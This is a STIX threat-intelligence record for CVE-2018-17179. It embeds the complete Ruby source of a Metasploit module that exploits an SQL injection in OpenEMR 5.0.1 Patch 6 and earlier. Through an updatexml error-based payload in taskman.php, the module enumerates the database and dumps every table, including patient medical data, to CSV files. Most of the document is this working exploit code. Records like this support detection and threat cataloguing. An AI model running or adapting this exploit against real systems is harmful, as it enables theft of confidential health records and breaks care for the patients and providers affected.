{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0fef2473-17d2-40f1-b042-3e408f4970dd",
    "created": "2024-08-14T16:22:00.827067Z",
    "modified": "2024-08-14T16:22:00.827071Z",
    "name": "OpenEMR 5.0.1 Patch 6 SQLi Dump",
    "description": " This module exploits a SQLi vulnerability found in OpenEMR version 5.0.1 Patch 6 and lower. The vulnerability allows the contents of the entire database (with exception of log and task tables) to be extracted. This module saves each table as a `.csv` file in your loot directory and has been tested with OpenEMR 5.0.1 (3). ' 'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/sqli/openemr/openemr_sqli_dump.rb",
            "external_id": "openemr_sqli_dump.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-17179"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/openemr/openemr/commit/3e22d11c7175c1ebbf3d862545ce6fee18f70617"
        }
    ],
    "x_code_snippet": "require 'csv'\n\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::SQLi\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'OpenEMR 5.0.1 Patch 6 SQLi Dump',\n      'Description' => '\n        This module exploits a SQLi vulnerability found in\n        OpenEMR version 5.0.1 Patch 6 and lower. The\n        vulnerability allows the contents of the entire\n        database (with exception of log and task tables) to be\n        extracted.\n        This module saves each table as a `.csv` file in your\n        loot directory and has been tested with\n        OpenEMR 5.0.1 (3).\n      ',\n      'License' => MSF_LICENSE,\n      'Author' =>\n        [\n          'Will Porter <will.porter[at]lodestonesecurity.com>'\n        ],\n      'References' => [\n        ['CVE', '2018-17179'],\n        ['URL', 'https://github.com/openemr/openemr/commit/3e22d11c7175c1ebbf3d862545ce6fee18f70617']\n      ],\n      'DisclosureDate' => '2019-05-17'\n    ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The base path to the OpenEMR installation', '/openemr'])\n      ]\n    )\n  end\n\n  def uri\n    target_uri.path\n  end\n\n  def openemr_version\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(uri, 'admin.php')\n    )\n    vprint_status(\"admin.php response code: #{res.code}\")\n    document = Nokogiri::HTML(res.body)\n    document.css('tr')[1].css('td')[3].text\n  rescue StandardError\n    ''\n  end\n\n  def check\n    # Check version\n    print_status('Trying to detect installed version')\n    version = openemr_version\n    return Exploit::CheckCode::Unknown if version.empty?\n\n    vprint_status(\"Version #{version} detected\")\n    version.sub! ' (', '.'\n    version.sub! ')', ''\n    version.strip!\n\n    return Exploit::CheckCode::Safe unless Rex::Version.new(version) < Rex::Version.new('5.0.1.7')\n\n    Exploit::CheckCode::Appears\n  end\n\n  def get_response(payload)\n    send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(uri, 'interface', 'forms', 'eye_mag', 'taskman.php'),\n      'vars_get' => {\n        'action' => 'make_task',\n        'from_id' => '1',\n        'to_id' => '1',\n        'pid' => '1',\n        'doc_type' => '1',\n        'doc_id' => '1',\n        'enc' => \"1' and updatexml(1,concat(0x7e, (#{payload})),0) or '\"\n      }\n    )\n  end\n\n  def save_csv(data, table)\n    # Use the same gsub pattern as store_loot\n    # this will put the first 8 safe characters of the tablename\n    # in the filename in the loot directory\n    safe_table = table.gsub(/[^a-z0-9\\.\\_]+/i, '')\n    store_loot(\n      \"openemr.#{safe_table}.dump\",\n      'application/CSV',\n      rhost,\n      data.map(&:to_csv).join,\n      \"#{safe_table}.csv\"\n    )\n  end\n\n  def dump_all\n    sqli_opts = {\n      truncation_length: 31, # slices of 31 bytes of the query response are returned\n      encoder: :base64, # the web application messes up multibyte characters, better encode\n      verbose: datastore['VERBOSE']\n    }\n    sqli = create_sqli(dbms: MySQLi::Common, opts: sqli_opts) do |payload|\n      res = get_response(payload)\n      if res && (response = res.body[%r{XPATH syntax error: '~(.*?)'</font>}m, 1])\n        response\n      else\n        ''\n      end\n    end\n    unless sqli.test_vulnerable\n      fail_with Failure::NotVulnerable, 'The target does not seem vulnerable.'\n    end\n    print_good 'The target seems vulnerable.'\n    db_version = sqli.version\n    print_status(\"DB Version: #{db_version}\")\n    print_status('Enumerating tables, this may take a moment...')\n    tables = sqli.enum_table_names\n    num_tables = tables.length\n    print_status(\"Identified #{num_tables} tables.\")\n    # These tables are impossible to fetch because they increase each request\n    skiptables = %w[form_taskman log log_comment_encrypt]\n    # large table containing text in different languages, >4mb in size\n    skiptables << 'lang_definitions'\n    tables.each_with_index do |table, i|\n      if skiptables.include?(table)\n        print_status(\"Skipping table (#{i + 1}/#{num_tables}): #{table}\")\n      else\n        columns_of_table = sqli.enum_table_columns(table)\n        print_status(\"Dumping table (#{i + 1}/#{num_tables}): #{table}(#{columns_of_table.join(', ')})\")\n        table_data = sqli.dump_table_fields(table, columns_of_table)\n        table_data.unshift(columns_of_table)\n        save_csv(table_data, table)\n      end\n    end\n    print_status(\"Dumped all tables to #{Msf::Config.loot_directory}\")\n  end\n\n  def run\n    dump_all\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-05-17"
}